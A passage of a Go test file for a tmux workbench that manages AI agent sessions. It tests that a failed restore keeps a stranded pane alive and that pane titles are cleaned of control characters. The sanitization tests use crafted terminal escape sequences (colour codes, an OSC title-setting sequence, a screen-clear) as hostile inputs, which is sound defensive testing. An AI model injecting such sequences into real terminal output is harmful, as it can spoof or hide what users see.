		t.Skipf("cannot start tmux server: %v", err)
	}

	dir := t.TempDir()
	names := []string{"a", "b"}
	full := make([]string, len(names))
	for i, n := range names {
		if err := tm.CreateSessionWithOpts(SessionOpts{
			Name: n, Provider: "claude", WorkDir: dir, Command: "sleep 300",
		}); err != nil {
			t.Fatalf("create session %s: %v", n, err)
		}
		full[i] = tm.FullSessionName("claude", n)
	}
	strandedPane, err := tm.paneID(full[0])
	if err != nil {
		t.Fatalf("paneID(%s): %v", full[0], err)
	}

	comp, err := tm.ComposeWorkbench(full, nil)
	if err != nil {
		t.Fatalf("ComposeWorkbench: %v", err)
	}

	// Inject a Restore failure for source a: pre-create a session with a's name
	// so Restore's `new-session -s <a>` collides and a's pane is left stranded.
	if _, err := tm.run("new-session", "-d", "-s", full[0]); err != nil {
		t.Fatalf("inject collision session: %v", err)
	}

	// Restore must report the partial failure but MUST NOT kill the holder.
	if err := comp.Restore(); err == nil {
		t.Fatal("Restore should return an error on partial failure")
	}
	if !tm.HasSession(comp.HolderName()) {
		t.Fatal("holder was killed on partial failure — stranded agent pane destroyed (#3277 regression)")
	}
	// The stranded agent pane survives inside the un-killed holder.
	out, err := tm.run("list-panes", "-s", "-t", comp.HolderName(), "-F", "#{pane_id}")
	if err != nil {
		t.Fatalf("list-panes holder: %v", err)
	}
	if !strings.Contains(out, strandedPane) {
		t.Errorf("stranded pane %s not found in holder (destroyed?):\n%s", strandedPane, out)
	}
	// The other source still restored successfully.
	if !tm.HasSession(full[1]) {
		t.Errorf("source %s should have been restored despite the partial failure", full[1])
	}
}

// TestSanitizeWorkbenchTitle verifies the #3286 remediation: control/escape
// characters are stripped from server-influenced workbench pane titles.
func TestSanitizeWorkbenchTitle(t *testing.T) {
	in := "red\x1b[31mtext\x1b\n\r\ttab\x7fdel\x1b]0;osc\x07end"
	got := sanitizeWorkbenchTitle(in)
	if strings.ContainsAny(got, "\x1b\n\r\t\x07\x7f") {
		t.Errorf("control/escape chars not stripped: %q", got)
	}
	for _, r := range got {
		if !unicode.IsPrint(r) {
			t.Errorf("non-printable rune %U survived in %q", r, got)
		}
	}
	// Plain text, spaces and the "·" separator are preserved unchanged.
	if got := sanitizeWorkbenchTitle("titan · demo · main"); got != "titan · demo · main" {
		t.Errorf("plain title changed: %q", got)
	}
	// Length is clamped.
	if got := sanitizeWorkbenchTitle(strings.Repeat("x", 200)); len(got) != 80 {
		t.Errorf("clamp: got len %d, want 80", len(got))
	}
}

// TestWorkbenchHeader_StripsControlChars proves both the metadata path
// (workbenchHeader) and the fallback path (workbenchPaneTitle) neutralize
// escape sequences from server-influenced components (#3286).
func TestWorkbenchHeader_StripsControlChars(t *testing.T) {
	got := workbenchHeader("tit\x1b[31man", "de\nmo", "ma\rin")
	if strings.ContainsAny(got, "\x1b\n\r") {
		t.Errorf("workbenchHeader leaked control chars: %q", got)
	}
	if clean := workbenchHeader("titan", "demo", "main"); clean != "titan · demo · main" {
		t.Errorf("clean header = %q, want \"titan · demo · main\"", clean)
	}
	if got := workbenchPaneTitle("vibeflow_claude-a\x1b[2Jb"); strings.ContainsAny(got, "\x1b") {
		t.Errorf("workbenchPaneTitle leaked ESC: %q", got)
	}
}
